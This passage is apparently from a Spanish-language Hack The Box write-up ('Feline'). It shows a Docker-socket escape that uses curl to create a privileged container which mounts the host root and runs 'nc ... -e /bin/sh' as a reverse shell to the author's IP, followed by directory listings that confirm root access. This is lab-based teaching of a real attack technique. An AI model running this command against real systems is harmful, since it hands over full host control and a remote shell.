* [Owning system through exposed docker engine - Cert.litnet.lt](https://cert.litnet.lt/2016/11/owning-system-through-an-exposed-docker-engine/).

En él nos muestra como obtener ejecución de comandos mediante la creación de un contenedor además de hacer una montura sobre la carpeta que le indiquemos; nosotros usaremos la imagen de `sandbox` para la creación del contenedor:

```bash
root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" http://localhost/containers/create?name=entramosOno -d '{"Image":"sandbox", "Cmd":["/usr/bin/nc", "10.10.14.218", "4435", "-e", "/bin/sh"], "Binds": [ "/:/montadoPA" ], "Privileged": true}'
```

Entonces, le indicamos que nos cree un `container` con el nombre `entramosOno`, que use la imagen `sandbox` y que cuando se ejecute haga una petición mediante `nc` a nuestra máquina para obtener una shell. Además de montar la raíz (`/`) del sistema sobre la ruta `montadoPA` del contenedor :)

Démosle:

![274bash_dockersock_shell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274bash_dockersock_shell.png)

Perfecto, obtenemos la shell, veamos si tenemos la montura:

```bash
ls -la /
total 68
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 .
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 ..
-rwxr-xr-x    1 root     root             0 Dec 23 00:45 .dockerenv
drwxr-xr-x    2 root     root          4096 May 29  2020 bin
drwxr-xr-x   13 root     root          3740 Dec 23 00:45 dev
drwxr-xr-x    1 root     root          4096 Dec 23 00:45 etc
drwxr-xr-x    2 root     root          4096 May 29  2020 home
drwxr-xr-x    7 root     root          4096 May 29  2020 lib
drwxr-xr-x    5 root     root          4096 May 29  2020 media
drwxr-xr-x    2 root     root          4096 May 29  2020 mnt
drwxr-xr-x   20 root     root          4096 Jun 30 12:47 montadoPA
drwxr-xr-x    2 root     root          4096 May 29  2020 opt
dr-xr-xr-x  205 root     root             0 Dec 23 00:45 proc
drwx------    2 root     root          4096 May 29  2020 root
drwxr-xr-x    2 root     root          4096 May 29  2020 run
drwxr-xr-x    2 root     root          4096 May 29  2020 sbin
drwxr-xr-x    2 root     root          4096 May 29  2020 srv
dr-xr-xr-x   13 root     root             0 Dec 23 00:45 sys
drwxrwxrwt    2 root     root          4096 May 29  2020 tmp
drwxr-xr-x    7 root     root          4096 May 29  2020 usr
drwxr-xr-x   12 root     root          4096 May 29  2020 var
```

Montado PAAAAAAA:

```bash
ls -la /root     
total 8
drwx------    2 root     root          4096 May 29  2020 .
drwxr-xr-x    1 root     root          4096 Dec 23 00:50 ..

ls -la /montadoPA/root
total 56
drwx------    6 root     root          4096 Dec 22 20:05 .
drwxr-xr-x   20 root     root          4096 Jun 30 12:47 ..
lrwxrwxrwx    1 root     root             9 Jun 17  2020 .bash_history -> /dev/null
-rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
drwx------    2 root     root          4096 Jun 30 09:23 .cache
drwxr-xr-x    3 root     root          4096 Jun 30 09:31 .local
-rw-r--r--    1 root     root           161 Dec  5  2019 .profile
-rw-r--r--    1 root     root            75 Jun 30 10:23 .selected_editor
drwx------    2 root     root          4096 Jun 30 09:10 .ssh
-rw-------    1 root     root         12235 Aug 26 14:28 .viminfo
-rw-r--r--    1 root     root           165 Jun 30 11:59 .wget-hsts
-rw-------    1 root     root            33 Dec 22 05:10 root.txt
drwxr-xr-x    3 root     root          4096 May 18  2020 snap
```

El único "problema" que veo es que no puedo ponerme una linda shell:

```bash
# valid login shells
/bin/sh
/bin/ash
```

Podríamos enumerar sobre el contenedor y sobre la montura del sistema para así intentar obtener una shell completamente interactiva, pero con lo que respecta a la máquina hemos finalizado :P

Solo nos quedaría ver las flags:

![274flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/feline/274flags.png)

...

Y nada más. Impresionante máquina eh! Docker no deja de sorprenderme :P Aprendí mucho, el inicio (como casi siempre) es lo más caótico, pero me pareció superinteresante, además de ser una vulnerabilidad que no conocía. El pivoteo entre contenedores... lindo lindo :)

Muchas gracias por pasarse y nos leeremos en otra ocasión :) a seguir rompiendo todo.